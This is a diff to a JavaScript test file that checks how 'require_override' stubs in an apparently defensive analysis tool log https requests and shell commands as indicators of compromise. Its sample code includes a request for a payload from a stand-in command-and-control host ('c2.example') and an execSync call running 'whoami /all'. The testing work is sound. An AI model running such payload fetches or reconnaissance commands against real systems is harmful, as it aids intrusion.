@@ -20,6 +20,8 @@ describe("require_override stubs", function() {
 		fs.writeFileSync(sample, [
 			"try { require(\"https\").request({hostname: \"tls.example\", port: 443, path: \"/a\"}); } catch (e) {}",
 			"try { require(\"node:https\").request({hostname: \"tls2.example\", port: 8443, path: \"/b\"}); } catch (e) {}",
+			"try { require(\"https\").request(new (require(\"url\").URL)(\"https://c2.example/payload?a=1\")); } catch (e) {}",
+			"try { require(\"https\").request({hostname: \"tls3.example\", port: \"\", pathname: \"/c\", search: \"?q\"}); } catch (e) {}",
 			"try { require(\"node:child_process\").execSync(\"whoami /all\"); } catch (e) {}",
 			"",
 		].join("\n"));
@@ -36,7 +38,8 @@ describe("require_override stubs", function() {
 		fs.rmSync(work, {recursive: true, force: true});
 	});
 	it("logs https requests through the http stub, as https", function() {
-		assert.deepStrictEqual(urls, ["https://tls.example/a", "https://tls2.example:8443/b"]);
+		assert.deepStrictEqual(urls, ["https://tls.example/a", "https://tls2.example:8443/b",
+			"https://c2.example/payload?a=1", "https://tls3.example/c?q"]);
 	});
 	it("gives node:-prefixed ids the same stub", function() {
 		assert(iocs.some((i) => i.value && i.value.command === "whoami /all"), JSON.stringify(iocs.map((i) => i.type)));
